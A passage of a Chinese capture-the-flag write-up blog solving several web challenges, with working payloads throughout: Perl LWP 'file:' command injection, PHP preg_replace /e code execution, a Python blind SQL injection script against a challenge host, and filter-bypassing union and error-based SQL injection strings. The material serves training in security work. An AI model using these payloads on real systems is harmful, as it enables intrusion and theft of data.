
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"GET "</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dir</span>  <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"dirname"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>代码的大概逻辑是：通过ip为用户创建个人文件夹；执行通过$url传参进来的内容，并将执行结果写入用户命名的文件中（$filename）。</p>
<p>回显给了ip</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216102256108.png" srcset="/img/loading.gif" alt="image-20201216102256108"></p>
<p>先确定文件夹路径是这个。</p>
<pre><code>sandbox/d1bcce949acb60e760fd148cea0a9ed5</code></pre><p>读取根目录，创建文件111。</p>
<pre><code>?url=/&amp;filename=111</code></pre><p>访问sandbox/d1bcce949acb60e760fd148cea0a9ed5/111</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216104527708.png" srcset="/img/loading.gif" alt="image-20201216104527708"></p>
<p>一开始想直接读，但读不到。</p>
<p>按题意应该是要借readflag去读。</p>
<p>那么执行readflag文件。</p>
<p>根据file协议的代码可知，要想进行到open函数，得文件名存在才行，所以要先建立一个命令的同名文件。</p>
<p>再去执行命令才能成功。</p>
<p>payload</p>
<pre><code>/?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></pre><pre><code>/?url=file:bash -c /readflag|&amp;filename=123</code></pre><p>读到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216111153734.png" srcset="/img/loading.gif" alt="image-20201216111153734"></p>
<h2 id="perl中-GET-open漏洞原理"><a href="#perl中-GET-open漏洞原理" class="headerlink" title="perl中 GET open漏洞原理"></a>perl中 GET open漏洞原理</h2><p>GET是Lib for WWW in Perl中的命令，目的是模拟http的GET请求。</p>
<p>GET后接路径，本身就可以获取文件或目录内容。</p>
<pre><code>GET /</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216101920820.png" srcset="/img/loading.gif" alt="image-20201216101920820"></p>
<pre><code>GET /etc/passwd</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216102014329.png" srcset="/img/loading.gif" alt="image-20201216102014329"></p>
<p>perl中处理file协议的perl5/LWP/Protocol/file.pm如下,可以看到引用了open函数：</p>
<pre class=" language-perl"><code class="language-perl"><span class="token comment" spellcheck="true">#第47行</span>
    <span class="token comment" spellcheck="true"># test file exists and is readable</span>
    <span class="token keyword">unless</span> <span class="token punctuation">(</span><span class="token operator">-e</span> <span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    return HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Response<span class="token operator">-></span>new<span class="token punctuation">(</span> <span class="token variable">&amp;HTTP::Status::RC_NOT_FOUND</span><span class="token punctuation">,</span>
                  <span class="token string">"File `$path' does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">unless</span> <span class="token punctuation">(</span><span class="token operator">-r</span> <span class="token filehandle symbol">_</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    return HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Response<span class="token operator">-></span>new<span class="token punctuation">(</span> <span class="token variable">&amp;HTTP::Status::RC_FORBIDDEN</span><span class="token punctuation">,</span>
                  <span class="token string">'User does not have read permission'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">...</span>
<span class="token comment" spellcheck="true">#第127行</span>
    <span class="token comment" spellcheck="true"># read the file</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">ne</span> <span class="token string">"HEAD"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    open<span class="token punctuation">(</span>F<span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token operator">or</span> return new  <span class="token comment" spellcheck="true">#&lt;---这里</span>
        HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Response<span class="token punctuation">(</span><span class="token variable">&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR</span><span class="token punctuation">,</span>
               <span class="token string">"Cannot read file '$path': $!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    binmode<span class="token punctuation">(</span>F<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span>  <span class="token variable">$self</span><span class="token operator">-></span>collect<span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$response</span><span class="token punctuation">,</span> <span class="token keyword">sub</span> <span class="token punctuation">{</span>
        <span class="token keyword">my</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">my</span> <span class="token variable">$bytes</span> <span class="token operator">=</span> sysread<span class="token punctuation">(</span>F<span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        return <span class="token operator">\</span><span class="token variable">$content</span> <span class="token keyword">if</span> <span class="token variable">$bytes</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>
        return <span class="token operator">\</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    close<span class="token punctuation">(</span>F<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">...</span></code></pre>
<p>而open函数存在命令执行漏洞。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216095710379.png" srcset="/img/loading.gif" alt="image-20201216095710379"></p>
<p>因此，当GET使用file协议时，会间接调用到open函数，导致命令执行。</p>
<pre><code>GET file:|ls</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216100656852.png" srcset="/img/loading.gif" alt="image-20201216100656852"></p>
<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>考点：php伪协议、preg_replace代码执行</p>
<p>源码：</p>
<pre><code>&lt;?php

error_reporting(0);
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){
  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
  if(preg_match(&quot;/flag/&quot;,$file)){
    die(&quot;Not now!&quot;);
  }

  include($file); //next.php

}
else{
  highlight_file(__FILE__);
}
?&gt;</code></pre><p>伪协议先读取next.php。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216115625307.png" srcset="/img/loading.gif" alt="image-20201216115625307"></p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//next.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可以看到preg_replace是在/e模式下的，这种情况存在命令执行漏洞。</p>
<p>可以构造Payload</p>
<pre><code>?.*={${phpinfo()}}</code></pre><p>但有个问题，PHP中会将$_GET数组参数名中的非法字符转换为下划线。这样我们构造的payload就失效了。</p>
<p>先fuzz下哪些字符非法。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216142532392.png" srcset="/img/loading.gif" alt="image-20201216142532392"></p>
<p>当符号为首字母时，只有.被判定为非法字符。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216143818256.png" srcset="/img/loading.gif" alt="image-20201216143818256"></p>
<p>构造一个GET下可用的paylad</p>
<pre><code>?\S*=${phpinfo()}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216144417591.png" srcset="/img/loading.gif" alt="image-20201216144417591"></p>
<p>找flag</p>
<pre><code>?\S*=${getflag()}&amp;cmd=system(&quot;ls%20/&quot;);</code></pre><p>cat flag</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216144920040.png" srcset="/img/loading.gif" alt="image-20201216144920040"></p>
<h1 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h1><p><strong>考点：无列名注入、bypass information</strong></p>
<p>bypass**下1,2回显不同</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216145728239.png" srcset="/img/loading.gif" alt="image-20201216145728239"></p>
<p>输入1 or 回显SQL Injection Checked.</p>
<p>试一下发现有过滤</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216145814722.png" srcset="/img/loading.gif" alt="image-20201216145814722"></p>
<p>fuzz一下</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216145746660.png" srcset="/img/loading.gif" alt="image-20201216145746660"></p>
<p>其中的information被过滤意味着我们常规的查表语句无法使用，需要有其他数据库来代替：</p>
<p>MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限）</p>
<p><strong>sys.schema_auto_increment_columns</strong></p>
<p><strong>schema_table_statistics_with_buffer</strong></p>
<p><strong>x$schema_table_statistics_with_buffer</strong></p>
<p><strong>sys.x$schema_flattened_keys</strong></p>
<p>…</p>
<p>诸如此类还有很多能应用的库。</p>
<p>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
<p>可是这个库不包含列名，所以又涉及到无列名注入的知识点。</p>
<p>但无列名注入通常由union来实现，而这里的union也被过滤了。</p>
<p>如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。</p>
<p>但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。</p>
<p>例如：</p>
<pre><code>执行select (select &#39;1&#39;,&#39;e~&#39;)&gt;(select * from table2 limit 1)显示0
执行select (select &#39;1&#39;,&#39;f~&#39;)&gt;(select * from table2 limit 1)显示1
执行select (select &#39;1&#39;,&#39;fl~&#39;)&gt;(select * from table2 limit 1)显示1</code></pre><p>但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题）</p>
<p>而区分大小写需要使用 <strong>SELECT CONCAT(“A”, CAST(0 AS JSON))</strong> 来另其返回二进制字符串。</p>
<p>综上，脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php"</span>

<span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    select <span class="token operator">=</span> <span class="token string">'select group_concat(table_name) from sys.x$schema_flattened_keys'</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
            paylaod <span class="token operator">=</span> <span class="token string">"1 &amp;&amp; (select substr(({}),{},1))='{}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>select<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#print(paylaod)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

<span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#区分大小写(应该是环境有问题 跑不出)</span>
    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'-0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    flag_table_name <span class="token operator">=</span> <span class="token string">'f1ag_1s_h3r3_hhhhh'</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
            i <span class="token operator">=</span> flag<span class="token operator">+</span>i
            paylaod <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag_table_name<span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#print(paylaod)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag<span class="token operator">=</span>i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
<span class="token keyword">def</span> <span class="token function">exp3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不区分大小写</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            a<span class="token operator">=</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>
            payload <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))"</span><span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span>
            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exp2<span class="token punctuation">(</span><span class="token punctuation">)</span>
    exp3<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>参考：<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104476566" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104476566</a></p>
<p><a href="https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2</a></p>
<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>考点：无列名注入</p>
<p>和上一道题有点像。但由于环境问题，需要用另一种姿势来做。</p>
<p>一开始的登录注册纯粹是迷惑人的。</p>
<p>进来是一个留言板，有二次注入。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216151316834.png" srcset="/img/loading.gif" alt="image-20201216151316834"></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216151306282.png" srcset="/img/loading.gif" alt="image-20201216151306282"></p>
<p>想测下字段，发现有过滤。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216151539036.png" srcset="/img/loading.gif" alt="image-20201216151539036"></p>
<p>该说不说，这题属实麻烦，想fuzz一下结果还限制上传条数。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216152839612.png" srcset="/img/loading.gif" alt="image-20201216152839612"></p>
<p>测了好半天。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216154202895.png" srcset="/img/loading.gif" alt="image-20201216154202895"></p>
<p>order被过滤，用 group测字段，测得字段数为22（…）。</p>
<p>常规payload,buu这环境没这库…</p>
<pre><code>-1&#39;/**/union/**/select/**/1,
(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum
ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
,19,20,21,&#39;22</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216155148981.png" srcset="/img/loading.gif" alt="image-20201216155148981"></p>
<p>找wp去了..据说是这个环境确实有点问题，基本wp都是基于已知users表的前提下写的。这个用的是子查询。</p>
<p>payload</p>
<pre><code>-1&#39;/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216155714338.png" srcset="/img/loading.gif" alt="image-20201216155714338"></p>
<pre><code>-1&#39;/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216155805859.png" srcset="/img/loading.gif" alt="image-20201216155805859"></p>
<p>正常情况还是用sys.schema_auto_increment_columns库的。</p>
<p>记录一下原题payload。</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#group by获取列数</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/group/**/by/**/22,'</span><span class="token number">11</span> 
<span class="token shell-comment comment">#查看版本</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span> 
<span class="token shell-comment comment">#获取表名</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1, (select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ,19,20,21,'</span><span class="token number">22</span> 
<span class="token shell-comment comment">#获取用户名</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span> 
<span class="token shell-comment comment">#获取密码</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre>
<p>报错注入</p>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">'/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||'</span>a<span class="token string">'='</span>a
<span class="token number">1</span><span class="token string">'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema='</span>web1<span class="token string">'),0x7e))/**/&amp;&amp;'</span>a<span class="token string">'='</span>a
<span class="token number">1</span><span class="token string">'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.2/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;'</span>a<span class="token string">'='</span>a
<span class="token number">1</span><span class="token string">'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;'</span>a<span class="token string">'='</span>a</code></pre>
<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//修改了环境变量，只能用绝对路径来调用系统命令</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
